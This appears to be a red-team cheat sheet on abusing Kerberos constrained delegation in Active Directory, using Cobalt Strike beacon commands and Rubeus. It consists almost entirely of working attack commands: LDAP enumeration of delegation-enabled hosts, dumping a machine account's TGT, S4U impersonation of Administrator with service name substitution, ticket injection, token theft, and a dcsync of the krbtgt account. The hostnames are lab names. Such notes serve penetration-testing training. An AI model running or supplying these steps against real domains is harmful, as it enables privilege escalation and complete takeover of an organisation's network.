
```
kerbeus s4u /impersonateuser:Administrator /domain:painters.htb /service:cifs/dc.painters.htb /altservice:cifs /ticket:
```
##### Constrained Delegation
Search for computers with Constrained Delegation (`msDS-AllowedToDelegateTo` not set to null)
```powershell
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

Check the UAC value to see if protocol transitioning is possible 
```powershell
ldapsearch (&(samAccountType=805306369)(samaccountname=DUB-WEB-1$)) --attributes userAccountControl
```

We want true
```powershell
[Convert]::ToBoolean(16781312 -band 16777216)
```

Within SYSTEM level beacon on Constrained Delegation host, dump TGT for the computer account
```powershell
make_token CONTOSO\rsteel Passw0rd!
jump psexec64 lon-ws-1 smb

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7  /service:krbtgt /nowrap
```


> Couple options here: 

1.  Perform the S4U abuse to obtain a usable service ticket using service name substitution

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:DUB-WEB-1$ /msdsspn:MSSQLSvc/dub-sql-1.dublin.contoso.com /altservice:cifs /impersonateuser:Administrator /nowrap /ticket:
```

> Use the FQDN for the services to avoid oopsies

2. Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value,

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:MSSQLSvc/dub-sql-1.dublin.contoso.com /impersonateuser:Administrator /nowrap /ticket:
```

---

 Inject the ticket into a sacrificial logon session.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DUBLIN.CONTOSO.COM /username:Administrator /password:FakePass /ticket:
```

 Impersonate the process and verify
```powershell
steal_token [PID]
run klist

ls \\lon-fs-1\c$
dcsync CONTOSO.COM CONTOSO\krbtgt
```